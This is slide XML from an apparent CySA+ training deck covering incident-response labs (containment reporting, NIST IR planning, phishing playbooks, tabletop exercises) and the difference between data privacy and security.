          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="TextBox 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 10: Document containment for the report</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Drop this straight into Lab 27's incident report.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; /tmp/containment.md &lt;&lt;EOF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 3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39" name="TextBox 3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0" name="TextBox 3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750</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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24 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Isolate a host with default-DROP firewall while keeping a management channel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Distinguish containment, eradication, and recovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Decide between cleanup and re-imaging.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Apply compensating controls during the cleanup window.</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751</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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25 — Incident Response Playbook and Tabletop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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will draft a NIST-aligned incident response plan, a one-page playbook, and run a 45-minute tabletop exercise against the scenario from Lab 20. This maps to CySA+ 3.3 (Preparation — IR plan, Tools, Playbooks, Tabletop, Training, BC/DR; Post-incident — Forensic analysis, Root cause, Lessons learned).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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752</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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25 — Reference Diagram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g_dc65adb904.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1317482" y="1783080"/>
            <a:ext cx="9553987" cy="4434840"/>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753</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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25 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: The NIST 800-61 incident-response life cycle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ 3.3 is exactly this loop with two of its four phases broken out.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ┌──────────────┐    ┌────────────────┐    ┌─────────────────────┐    ┌──</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Author the high-level IR plan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/lab25 &amp;&amp; cd /tmp/lab25</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Author a one-page phishing playbook</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; playbook_phishing.md &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Run a 45-minute tabletop exercise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Scenario (read aloud at T = 0): &gt; "08:00 — A finance user reports an invoice email looked off but opened it.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Capture lessons learned (post-incident)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>These actions become the inputs to the next Preparation cycle — closing the NIST loop.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; hot_wash.md &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 3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41" name="TextBox 4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2" name="TextBox 4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754</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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25 — Hands-On Steps (cont'd)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4434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44348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05840" y="377190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3771900"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Training (CySA+ 3.3 "Training")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Schedule four touches per year:</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755</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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25 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The NIST 800-61 IR life cycle and how it maps to CySA+ 3.3.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Draft a high-level IR plan with RACI, severity, and escalation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Author a one-page playbook for the most common incident type.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Run a structured tabletop and capture lessons learned that feed back into preparation.</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756</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 RECAP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Recap — Incident Response and Management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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attack frameworks (Kill Chain, ATT&amp;CK, Diamond)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence acquisition &amp; chain of custody</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Memory &amp; host forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Log analysis for IR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Containment &amp; isolation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  IR playbooks &amp; tabletop exercises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757</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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4 · 17% OF CS0-003</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Reporting and Communication</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4</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758</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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EXAM WEIGHTING 17%</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Topic 4 Overview — Reporting and Communication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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vulnerability management reporting</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Executive incident reporting</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Security metrics (MTTD/MTTR)</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Compliance reporting (PCI DSS / ISO 27001 / NIST)</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Stakeholder communication &amp; lessons learned</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759</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · DATA PRIVACY AND SECURITY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Data Privacy and Security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Data privacy and data security are related but distinct concepts, where privacy is about the individual and the appropriate collection and use of their information, and security is about protecting the data itself from unauthorized access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Privacy also differs from confidentiality, since confidentiality is a security property focused on keeping data secret through controls, while privacy is focused on keeping an individual's identity and personal information governed by how the data may be used.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data security is enforced through technical and administrative controls, whereas privacy governs data usage, consent, and handling of data types such as personal data and personally identifiable information (PII).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because a system can be secure yet still violate privacy through improper use of data, so protecting confidentiality is necessary but not sufficient to meet privacy obligations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect conceptual questions that ask you to distinguish privacy (about the individual and how data is used) from security and confidentiality (about protecting the data itself).</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760</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · DATA PRIVACY AND SECURITY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Data Privacy and Security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Privacy vs. security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Privacy is about the individual</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
